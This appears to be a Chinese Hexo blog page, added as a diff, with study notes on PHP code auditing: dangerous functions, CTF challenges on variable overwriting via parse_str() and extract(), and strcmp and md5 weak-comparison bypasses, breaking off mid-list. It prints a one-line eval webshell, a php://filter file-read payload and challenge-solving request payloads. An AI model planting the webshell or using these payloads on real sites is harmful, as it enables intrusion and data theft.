@@ -1,0 +1,642 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Doraemoo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="常见函数及特殊函数PHP代码执行函数eval1234eval(string $code)把字符串$code 作为php代码执行很多常见的webshell都是用eval来执行具体操作的。&lt;?php @eval($_POST[&amp;#x27;cmd&amp;#x27;]);?&gt;  assert12assert()mixed $assertion [string $description]检查一个断言是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP代码审计">
+<meta property="og:url" content="https://doraemoo.github.io/2022/03/03/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="Doraemoo">
+<meta property="og:description" content="常见函数及特殊函数PHP代码执行函数eval1234eval(string $code)把字符串$code 作为php代码执行很多常见的webshell都是用eval来执行具体操作的。&lt;?php @eval($_POST[&amp;#x27;cmd&amp;#x27;]);?&gt;  assert12assert()mixed $assertion [string $description]检查一个断言是">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-03T06:11:45.000Z">
+<meta property="article:modified_time" content="2022-03-03T06:12:30.851Z">
+<meta property="article:author" content="Doraemoo">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  <title>PHP代码审计 - Doraemoo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"doraemoo.github.io","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":17691437,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Doraemoo</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://w.wallhaven.cc/full/wq/wallhaven-wqv5xx.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="PHP代码审计">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-03 14:11" pubdate>
+        2022年3月3日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      8.9k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      75 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PHP代码审计</h1>
+            
+            <div class="markdown-body">
+              <h2 id="常见函数及特殊函数"><a href="#常见函数及特殊函数" class="headerlink" title="常见函数及特殊函数"></a>常见函数及特殊函数</h2><h3 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span>)<br>把字符串<span class="hljs-variable">$code</span> 作为php代码执行<br>很多常见的webshell都是用<span class="hljs-keyword">eval</span>来执行具体操作的。<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>()<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [<span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span>]<br>检查一个断言是否为<span class="hljs-literal">FALSE</span> 把字符串<span class="hljs-variable">$assertion</span>作为PHP代码来执行具体操作的。<br></code></pre></td></tr></table></figure>
+
+<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span>, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span>, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span>[<span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span>[<span class="hljs-keyword">int</span>&amp;<span class="hljs-variable">$count</span>]])<br>/e 修正符使<span class="hljs-title function_ invoke__">preg_replace</span>()将replacement参数当做PHP代码<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/test/e&#x27;</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;h&#x27;</span>],<span class="hljs-string">&#x27;just test&#x27;</span>);<br>如果我们提交?h=<span class="hljs-title function_ invoke__">phpinfo</span>(),<span class="hljs-title function_ invoke__">phpinfo</span>()将会执行<br></code></pre></td></tr></table></figure>
+
+<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">create_function</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$args</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span> )<br>创建一个匿名函数，并返回一个独一无二的函数名<br><span class="hljs-variable">$newfunc</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$v&#x27;</span>,<span class="hljs-string">&#x27;return system($v);&#x27;</span>);<br><span class="hljs-variable">$newfunc</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>); 就相当于<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> [, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$parameter</span> [, <span class="hljs-keyword">mixed</span> $... ]] )<br>call_user_func — 把第一个参数作为回调函数调用，其余参数是回调函数的参数。<br></code></pre></td></tr></table></figure>
+
+<h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func_array</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$param_arr</span> )<br>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><p>require、include、 require_ once 、 include_once</p>
+<blockquote>
+<p>包含函数一共有四个 ,主要作用为包含并运行指定文件。<br>include $file;</p>
+<p>在变量$file可控的情况下,我们就可以包含任意文件,从而达到getshell的目的。<br>另外,在不同的配置环境下,可以包含不同的文件。<br>因此又分为远程文件包含和本地文件包含。<br>包含函数也能狗读取任意文件内容,这就需要用到[支持的协议和封装协议]和[过滤器]。</p>
+</blockquote>
+<blockquote>
+<p>例如,利用php流filter读取任意文件<br>include($_ GET[‘file’]);<br>?file&#x3D; php:&#x2F;&#x2F;filter&#x2F;convrt.base64-encode&#x2F;resource &#x3D;index.php</p>
+</blockquote>
+<h3 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>()	执行一个外部程序<br><span class="hljs-title function_ invoke__">passthru</span>()	执行外部程序并且显示原始输出<br><span class="hljs-title function_ invoke__">proc_open</span>()	执行一个命令，并且打开用来输入/输出的文件指针<br><span class="hljs-title function_ invoke__">shell_exec</span>()&amp;``		通过shell环境执行命令，并且将完整的输出以字符串的方式返回。<br><span class="hljs-title function_ invoke__">system</span>()	执行外部程序，并且显示输出<br><span class="hljs-title function_ invoke__">popen</span>()		通过<span class="hljs-title function_ invoke__">popen</span>()的参数传递一条命令，并对<span class="hljs-title function_ invoke__">popen</span>()所打开的文件进行执行<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>执行函数包括但不限于上述几个。</p>
+<p>只要命令的参数可控就能够执行系统命令。</p>
+</blockquote>
+<h3 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">copy	拷贝文件<br>file_get_contents 	将整个文件读入一个字符串<br>file_put_contents	将一个字符串写入文件<br>file 	把整个文件读入一个数组中<br>fopen 	打开文件或URL<br>move_uploaded_file 	将上传文件移动到新的位置<br>readfile 	输出文件<br>rename	 	重命名一个文件或目录<br>rmdir		删除目录<br>unlink &amp; delete 	删除文件<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>任意文件读取、写入、删除、往往是上面几个函数受到了控制（当然还有其他函数）</p>
+<p>不同函数在不同的场景有不同的作用和不同的利用手法。</p>
+<p>读取：可以读取配置等文件，按到key</p>
+<p>写入：可以入shell代码相关的内容</p>
+<p>删除：可以删除.lock文件而可以重新安装覆盖</p>
+</blockquote>
+<h3 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h3><h4 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">is_numeric</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$var</span> )<br>如果 <span class="hljs-keyword">var</span> 是数字和数字字符串则返回 <span class="hljs-literal">TRUE</span>，否则返回 <span class="hljs-literal">FALSE</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>仅用is_numeric判断而不用intval转换就有可能插入16进制字符串到数据库，进而可能导致sql二次注入。</p>
+</blockquote>
+<h4 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">in_array</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$haystack</span> [, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$strict</span> = <span class="hljs-literal">FALSE</span> ] ) <br>大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。<br>该函数有一个特性，比较之前会进行自动类型转换。<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;1abc&#x27;</span>;<br><span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$a</span>,<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))的返回<br></code></pre></td></tr></table></figure>
+
+<h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">parse_str</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$encoded_string</span> [, <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$result</span> ] ) <br>将字符串解析成多个变量<br>如果 encoded_string 是 URL 传递入的查询字符串（query <span class="hljs-keyword">string</span>），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。<br></code></pre></td></tr></table></figure>
+
+<p><strong>parse_str()导致的变量覆盖问题</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>       <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <br>      &#123;<br>            <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>            <span class="hljs-keyword">die</span>();<br>      &#125; <br>      <span class="hljs-keyword">else</span> <br>     &#123;<br>            <span class="hljs-keyword">include</span> (‘flag.php’);<br>            <span class="hljs-variable">$a</span> = “www.OPENCTF.com <br>            <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>            @<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != ‘QNKCDZO’ &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(‘QNKCDZO’)) <br>           &#123;<br>                 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>           &#125; <br>           <span class="hljs-keyword">else</span> <br>           &#123;<br>                 <span class="hljs-keyword">exit</span>(‘其实很简单其实并不难！’);<br>           &#125;<br><br>       &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用GET请求id&#x3D;a[0]&#x3D;240610708，这样会将a[0]的值覆盖为<strong>240610708</strong>，然后经过md5后得到<strong>0e462097431906509019562988736854与md5(‘QNKCDZO’)<strong>的结果</strong>0e830400451993494058024219903391</strong>比较都是0 所以相等，满足条件，得到flag。</p>
+</blockquote>
+<h4 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">extract — 从数组中将变量导入到当前的符号表<br><br>说明<br><span class="hljs-title function_ invoke__">extract</span> ( <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$array</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = EXTR_OVERWRITE [, <span class="hljs-keyword">string</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-literal">NULL</span> ]] )<br>本函数用来将变量从数组中导入到当前的符号表中。<br><br>检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。<br></code></pre></td></tr></table></figure>
+
+<p><strong>extract()函数导致的变量覆盖问题</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>   <span class="hljs-variable">$flag</span> = ‘xxx’;<br><br>   <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$gift</span>)) <br>  &#123;<br>       <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$gift</span> == <span class="hljs-variable">$content</span>) <br>      &#123;<br>            <span class="hljs-keyword">echo</span> ‘hctf&#123;…&#125;’;<br><br>      &#125; <br>       <span class="hljs-keyword">else</span> <br>      &#123;<br>           <span class="hljs-keyword">echo</span> ‘Oh..’;<br>      &#125;<br><br>   &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>题目分析：</strong> </p>
+<blockquote>
+<p>题目使用了**extract($_GET)<strong>接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用</strong>extract()**对变量进行覆盖，从而满足各个条件。</p>
+</blockquote>
+<p><strong>解题方法：</strong> </p>
+<blockquote>
+<p>GET请求 ?flag&#x3D;&amp;gift&#x3D;，extract()会将flag和flag和gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足gift&#x3D;&#x3D;content。</p>
+<p>最终PAYLOAD： </p>
+<p>GET DATA： ?flag&#x3D;&amp;gift&#x3D;</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == “POST”) <br>   &#123;<br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass</span> == <span class="hljs-variable">$thepassword_123</span>) <br>       &#123; <br><br>            &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=”<span class="hljs-title">alert</span> <span class="hljs-title">alert</span>-<span class="hljs-title">success</span>”&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">            &lt;<span class="hljs-title">code</span>&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">theflag</span>; ?&gt;&lt;/<span class="hljs-title">code</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">        &#125; </span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>题目分析：</strong> </p>
+<blockquote>
+<p>题目要求使用POST提交数据，<strong>extract($_POST)<strong>会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖</strong>$pass</strong>和**$thepassword_123<strong>变量的值，从而满足</strong>pass&#x3D;&#x3D;thepassword_123**这个条件。</p>
+</blockquote>
+<p><strong>解题方法：</strong> </p>
+<blockquote>
+<p>使用POST请求提交<strong>pass&#x3D;&amp;thepassword_123&#x3D;</strong>, 然后<strong>extract()<strong>会将接收到的数据将</strong>$pass</strong>和**$thepassword_123**变量的值覆盖为空，便满足条件了。</p>
+<p>最终PAYLOAD： </p>
+<p>POST DATA：pass&#x3D;&amp;thepassword_123&#x3D;</p>
+</blockquote>
+<h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><blockquote>
+<p>strcmp(str1, str2)比较两个字符串大小，若是非字符串（例如数组）比较，则会出错。在5.3之前的php中，显示了报错的警告信息后，将return 0。0&#x3D;&#x3D;0执行</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;xxxxx&#125;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="hljs-comment">//比较两个字符串（区分大小写）</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;No&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h4><p>12&#x2F;2&#x2F;2020 </p>
+<p>雨   正常</p>
+<p>记录一些常见的md5绕过姿势</p>
+<ol>
+<li>md5弱类型比较</li>
+</ol>
+<ul>
+<li><p>数组绕过</p>
+<blockquote>
+<p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br>数组绕过适用于源码中没有判断变量类型或内容，如果加上了过滤函数就不能使用了</p>
+</blockquote>
+<blockquote>
+<p>常见过滤函数如下：<br>ctype_alnum ( string $text ) : bool<br>&#x2F;&#x2F; 如果text中所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回FALSE </p>
+<p>is_numeric ( mixed $var ) : bool<br>&#x2F;&#x2F; 如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。</p>
+</blockquote>
+</li>
+<li><p>科学计数法绕过</p>
+<blockquote>
+<p>只要两个数的md5加密后的值以0e开头就可以绕过，因为php在进行弱类型比较 即=&#x3D;时,会现转换字符串的类型，在进行比较，而在比较是因为两个数都是以0e开头会被认为是科学计数法，0e后面加任何数在科学计数法中都是0，所以两数相等，在进行严格比较&#x3D;&#x3D;&#x3D;时才会先判断字符串类型是否相等，在比较。<br>像这样特殊的md5值有：</p>
+</blockquote>
+</li>
+</ul>
